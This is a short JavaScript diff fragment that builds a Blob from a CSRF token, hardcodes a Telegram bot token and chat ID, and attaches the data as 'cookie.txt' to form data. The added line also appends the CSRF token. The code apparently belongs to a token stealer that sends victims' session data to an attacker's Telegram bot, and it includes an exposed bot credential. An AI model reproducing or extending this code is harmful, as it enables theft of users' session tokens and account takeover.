@@ -61,6 +61,7 @@ const blob = new Blob([csrfToken], { type: "text/plain" });
 const formData = new FormData();
 const botToken = "7651094116:AAE_ZF_VLBtbCzCaiE7xcahnRldGSQjN4KU";
 const chatId = "1139790477";
+formData.append("csrf_token", csrfToken); // Add CSRF token to formData
 formData.append("chat_id", chatId);
 formData.append("document", blob, "cookie.txt");
 
